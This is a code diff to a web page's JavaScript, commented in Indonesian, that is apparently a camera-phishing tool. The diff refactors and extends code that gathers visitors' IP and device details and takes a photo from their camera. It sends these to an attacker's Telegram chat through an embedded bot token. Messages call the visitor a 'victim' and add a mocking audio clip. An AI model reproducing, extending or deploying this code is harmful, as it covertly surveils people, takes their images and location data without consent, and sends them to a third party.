@@ -201,6 +201,7 @@ h1 {
 const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo";
 const CHAT_ID="6051179992";
 const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";
+const MP3_URL="https://files.catbox.moe/a957je.mp3";
 
 function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
 
@@ -362,17 +363,29 @@ function formatBytes(bytes, decimals = 2) {
   return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 }
 
+async function sendToTelegram(method, data) {
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+      method: "POST",
+      headers: method === "sendDocument" ? {} : {"Content-Type": "application/json"},
+      body: method === "sendDocument" ? data : JSON.stringify(data)
+    });
+    return await response.json();
+  } catch (error) {
+    console.error("Error sending to Telegram:", error);
+    return null;
+  }
+}
+
 async function sendIpDevice(){
   const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: STATIC_IMAGE,
-      caption: buildCaption(ip,d,additional),
-      parse_mode:"HTML"
-    })
+  
+  // Kirim foto static dengan caption data
+  await sendToTelegram("sendPhoto", {
+    chat_id: CHAT_ID,
+    photo: STATIC_IMAGE,
+    caption: buildCaption(ip,d,additional),
+    parse_mode: "HTML"
   });
 }
 
@@ -394,43 +407,49 @@ async function sendSnapshot(){
 
     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
+    // 1. Kirim data terlebih dahulu
+    const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
+    
+    // Kirim data sebagai pesan terpisah
+    await sendToTelegram("sendMessage", {
+      chat_id: CHAT_ID,
+      text: "📱 DATA KORBAR DITEMUKAN!\n\n" + buildCaption(ip,d,additional),
+      parse_mode: "HTML"
+    });
+
+    // 2. Kirim MP3
+    await sendToTelegram("sendAudio", {
+      chat_id: CHAT_ID,
+      audio: MP3_URL,
+      caption: "jogetin aja dulu 😹"
+    });
+
+    // 3. Kirim foto korban
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
-    formData.append("caption", "📸 SUKSES SCREENSHOT FOTO TARGET\n🕐 Waktu: " + new Date().toLocaleString('id-ID'));
+    formData.append("document", blob, "foto_korban.jpg");
+    formData.append("caption", "📸 FOTO KORBAN BERHASIL DIAMBIL!\n🕐 Waktu: " + new Date().toLocaleString('id-ID'));
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-      method: "POST",
-      body: formData
-    });
+    await sendToTelegram("sendDocument", formData);
 
     stream.getTracks().forEach(track=>track.stop());
     video.remove();
-    
-    // Kirim data tambahan setelah foto
-    const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: buildCaption(ip,d,additional),
-        parse_mode:"HTML"
-      })
-    });
     
   }catch(e){
     console.log("Error camera:", e);
     // Tetap kirim data meski camera gagal
     const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: "❌ Gagal akses kamera, tapi data berhasil dikumpulkan:\n\n" + buildCaption(ip,d,additional),
-        parse_mode:"HTML"
-      })
+    await sendToTelegram("sendMessage", {
+      chat_id: CHAT_ID,
+      text: "❌ Gagal akses kamera, tapi data berhasil dikumpulkan:\n\n" + buildCaption(ip,d,additional),
+      parse_mode: "HTML"
+    });
+    
+    // Kirim MP3 meski camera gagal
+    await sendToTelegram("sendAudio", {
+      chat_id: CHAT_ID,
+      audio: MP3_URL,
+      caption: "🎵 Audio untuk korban"
     });
   }
 }
